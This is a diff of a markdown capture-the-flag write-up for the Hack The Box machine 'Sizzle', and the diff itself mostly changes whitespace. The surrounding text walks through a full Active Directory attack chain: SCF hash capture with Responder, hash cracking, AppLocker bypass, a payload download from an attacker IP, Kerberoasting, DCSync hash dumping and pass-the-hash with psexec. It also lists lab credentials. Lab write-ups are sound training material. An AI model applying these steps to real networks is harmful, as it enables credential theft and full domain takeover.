@@ -37,6 +37,7 @@ Operations
 There are a lot of folders and some could be writable
 
 - To determine if any is writable - we need to mount the share first:
+
 ```bash
 sudo mount -t cifs -o rw,username=guest,password= '//sizzle.htb.local/Department Shares' /mnt
 
@@ -52,10 +53,9 @@ echo "Writable folders within /mnt directory:"
 
 # Use find command to list directories under /mnt
 # Attempt to create a file in each directory to check writability
-
 find /mnt -type d -exec sh -c 'touch "$1/x" 2>/dev/null && echo "$1 is writable"' sh {} \;
-
 ```
+
 - The script needs to be run with **sudo**:
 
 ![image4](../resources/b176e8f9dc414b67a754c2f26899df48.png)
@@ -76,6 +76,7 @@ The way this works is a victim user opens the share  `\\sizzle.htb.local\ZZ_ARCH
 ![image5](../resources/199e3d833df24aff97c2a04e9268be5b.png)
 
 - Connect to the share
+
 ```bash
 smbclient //sizzle.htb.local/'Department Shares'
 
@@ -83,6 +84,7 @@ smbclient //sizzle.htb.local/'Department Shares'
 Upload the icon.scf file to the writable folders
 
 - Set up Responder:
+
 ```bash
 sudo ./Responder.py -I tun0
 
@@ -104,6 +106,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ![image8](../resources/af02e649940645b0a6733cdb18143161.png)
 
 - Trying to connect via winrm fails - but it gives an error message:
+
 ```bash
 evil-winrm -i sizzle.htb.local -u amanda -p Ashare1972
 
@@ -118,6 +121,7 @@ evil-winrm -i sizzle.htb.local -u amanda -p Ashare1972
 ![image11](../resources/a5ee11575d2d4f2fba246ece3ca1664a.png)
 
 - Amanda has read on the CertEnroll Share:
+
 ```bash
 smbmap -H sizzle.htb.local -u amanda -p Ashare1972
 
@@ -126,6 +130,7 @@ smbmap -H sizzle.htb.local -u amanda -p Ashare1972
 ![image12](../resources/2cc3ed0f72b941f48c4ab83c635edb2f.png)
 
 - The share contains CA certs:
+
 ```bash
 smbclient //sizzle.htb.local/'CertEnroll' -U 'amanda%Ashare1972'
 
@@ -134,6 +139,7 @@ smbclient //sizzle.htb.local/'CertEnroll' -U 'amanda%Ashare1972'
 ![image13](../resources/dc49dd31b5574775a097bf8c3ae3b5aa.png)
 
 - Doing another scan with enum4linux:
+
 ```bash
 enum4linux -u amanda -p Ashare1972 -a sizzle.htb.local
 
@@ -176,6 +182,7 @@ We can see there is a Certificate Service
 - Download the certificate, certificate chain, or CRL
 
 - <u>Step 1 - Generate CSR (leave all options blank):</u>
+
 ```bash
 openssl req -new -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
 
@@ -218,6 +225,7 @@ openssl x509 -inform der -in certnew.cer -noout -text
 
 [https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558)
 
+
 - **<u>Option 1 (Evil-WinRM):</u>**
 
 We can see that with Evil-WinRM we can supply a Public and Private key
@@ -235,6 +243,7 @@ evil-winrm -S -i 10.129.7.164 -u amanda -p Ashare1972 -c certnew.cer -k amanda.k
 - **<u>Option 2 (WinRM Ruby Script):</u>**
 
 - First, we need to install WinRM gem:
+
 ```bash
 sudo gem install winrm
 
@@ -251,6 +260,7 @@ sudo gem install winrm
 **Note: WSMan and WinRM are different technologies; WSMan is the protocol for accessing and managing resources over a network. While WinRM is a Windows-specific implementation of the WS-Man protocol.**
 
 - Run the script:
+
 ```bash
 ruby winrm_shell.rb
 
@@ -263,6 +273,7 @@ To run on Windows - look at the bottom of this link:
 [https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558)
 
 - We get permission denied when trying to upload files, even after setting the execution policy to bypass:
+
 ```bash
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
@@ -271,6 +282,7 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 ![image29](../resources/f609b1aee1224cd4b8c9906816add0b1.png)
 
 - This probably means that AppLocker is running:
+
 ```bash
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
@@ -303,17 +315,20 @@ This is whitelisted by default: **C:\Windows\System32\spool\drivers\color**
 
 - Use icacls to check:
   - We can use icacls to look through all of the folders, subfolders and files in C:\Windows:
+
 ```bash
-icacls C:\Windows\* /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%"
+		icacls C:\Windows\* /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%"
 
 ```
 - Or we can only list the folders and subfolders (smaller output):
+
 ```bash
-icacls C:\Windows\* /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" | findstr /i /v "\."
+		icacls C:\Windows\* /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" | findstr /i /v "\."
 
 ```
 
 - Or try each directory individually:
+
 ```bash
 icacls C:\Windows\System32\spool\drivers\color /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%"
 
@@ -322,6 +337,7 @@ icacls C:\Windows\System32\spool\drivers\color /t /c /q | findstr /i "(F) (M) (W
 ![image32](../resources/0a220f75dd614cc3be569202c3d4112e.png)
 
 - Or we can add all those potential directories into a txt file and run **(must be in cmd)**:
+
 ```bash
 for /F %A in (C:\temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 
 
@@ -332,11 +348,13 @@ for /F %A in (C:\temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /
 - We can't use evil-winrm's built in upload
 
 - Using wget and python http.server or using impacket-smbserver
+
 ```bash
 wget http://10.10.14.31/SharpHound.exe -O sharphound.exe
 
 ```
 - Run SharpHound:
+
 ```bash
 .\sharphound.exe -c all
 
@@ -346,6 +364,7 @@ wget http://10.10.14.31/SharpHound.exe -O sharphound.exe
 ![image33](../resources/409b82811b854b4490b0091b60e9b209.png)
 
 - Acces the share and get the loot file:
+
 ```bash
 smbclient //sizzle.htb.local/'Department Shares' -U "amanda%Ashare1972"
 
@@ -363,6 +382,7 @@ And that user MRLKY has DCSync rights:
 ![image35](../resources/adb2d60f9f0c4e2aa3f9125d31ae4bde.png)
 
 - But when we try to Kerberoast:
+
 ```bash
 impacket-GetUserSPNs htb.local/amanda:Ashare1972 –dc-ip 10.129.7.164 -request
 
@@ -383,6 +403,7 @@ It gets the user mrlky because the has a valid SPN set but it can't Kerberoast t
 ![image39](../resources/c073fba66a5e4bef98d6b5ae52ab1442.png)
 
 - To kerberoast locally, we can use Rubeus:
+
 ```bash
 .\Rubeus.exe kerberoast /user:mrlky
 
@@ -404,7 +425,6 @@ $Password = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)
 Invoke-UserImpersonation -Credential $Cred
 Invoke-Kerberoast
-
 ```
 
 - Or use RunasCs:
@@ -417,6 +437,7 @@ Invoke-Kerberoast
 ![image42](../resources/befe58dd6b5d44eca06df94c97777820.png)
 
 - Copy the hash to a file and crack:
+
 ```bash
 hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -426,6 +447,7 @@ hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt
 **Mrlky : Football#7**
 
 - Since the user has DCSync rights - we can dump hashes:
+
 ```bash
 impacket-secretsdump htb.local/mrlky:Football#7@10.129.7.164
 
@@ -440,6 +462,7 @@ mimikatz lsadump::dcsync /user:administrator /domain:htb.local /dc:sizzle
 
 ```
 - Now use either smbexec.py , psexec.py or wmiexec.py to get a shell:
+
 ```bash
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 htb.local/administrator@10.129.7.164
 
@@ -447,9 +470,9 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3
 
 ![image45](../resources/8bf3be1db1724c55ac52b52f6d0e5312.png)
 
+
 ```bash
 type user.txt
-
 type root.txt
 
 ```
